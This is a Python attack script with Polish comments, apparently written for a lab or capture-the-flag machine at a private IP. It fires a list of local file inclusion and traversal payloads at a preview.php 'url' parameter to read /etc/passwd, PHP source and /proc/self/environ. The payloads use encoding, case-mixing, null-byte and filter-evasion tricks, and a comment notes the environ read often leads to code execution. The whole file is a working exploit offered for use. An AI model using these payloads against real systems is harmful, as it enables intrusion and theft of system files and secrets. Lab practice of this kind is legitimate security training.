import requests

# Zmień na IP swojej maszyny z zadania
TARGET_URL = "http://10.114.175.163/preview.php?url=cvssm1/"

# Rozbudowana lista payloadów LFI z podziałem na techniki omijania (Evasion)
payloads = [
    # 1. Podstawowe schematy
    "file:///etc/passwd",
    "/etc/passwd",
    
    # 2. Mieszanie wielkości liter (Case-Sensitivity Bypass)
    "fIlE:///etc/passwd",
    "FiLe:///etc/passwd",
    "pHp://filter/convert.base64-encode/resource=preview.php",
    
    # 3. Klasyczny Directory Traversal i Null Byte (dla starszych wersji PHP)
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/passwd\x00",
    
    # 4. Omijanie filtrów usuwających "../" (Zagnieżdżanie i modyfikacje)
    "....//....//....//....//etc/passwd",
    "..././..././..././..././etc/passwd",
    "....\\/....\\/....\\/....\\/etc/passwd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    
    # 5. Kodowanie URL (URL Encoding)
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    
    # 6. Podwójne kodowanie URL (Double URL Encoding)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%2566%2569%256c%2565:///etc/passwd", # Podwójnie zakodowane "file"
    
    # 7. Alternatywne PHP Wrappers
    "php://filter/read=convert.base64-encode/resource=preview.php",
    "php://filter/read=string.rot13/resource=preview.php", # Omijanie filtrów wyłapujących słowo "base64"
    
    # 8. Inne kluczowe pliki systemowe (jeśli /etc/passwd jest na czarnej liście)
    "file:///etc/issue",
    "file:///etc/hostname",
    "file:///proc/self/environ" # Odczytanie tego pliku często prowadzi do RCE
]

print("[*] Rozpoczynam rozszerzone ataki LFI...")

for payload in payloads:
    # Wypisujemy aktualny payload z carriage return (\r), aby nadpisywać linię w terminalu
    print(f"[*] Testuję: {payload:<60}", end="\r")
    params = {"url": payload}
    
    try:
        response = requests.get(TARGET_URL, params=params, timeout=5)
        
        # Weryfikacja sukcesu - sprawdzamy różne sygnatury w zależności od payloadu
        if "root:x:0:0" in response.text:
            print(f"\n[+] SUKCES (Odczytano /etc/passwd)! Wektor: {payload}")
            
        elif "PD9wa" in response.text:
            print(f"\n[+] SUKCES (Odczytano kod w Base64)! Wektor: {payload}")
            
        elif "<?php" in response.text:
            print(f"\n[+] SUKCES (Odczytano surowy kod PHP)! Wektor: {payload}")
            
        elif "HTTP_USER_AGENT" in response.text or "DOCUMENT_ROOT" in response.text:
            print(f"\n[+] SUKCES (Odczytano /proc/self/environ)! Wektor: {payload}")
            
        # Zgrubne sprawdzenie dla /etc/issue lub /etc/hostname
        elif ("Ubuntu" in response.text or "Debian" in response.text) and "issue" in payload:
             print(f"\n[+] SUKCES (Odczytano plik /etc/issue)! Wektor: {payload}")
             
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Błąd połączenia przy payloadzie {payload}: {e}")

print("\n[+] Skanowanie zakończone.                                        ")
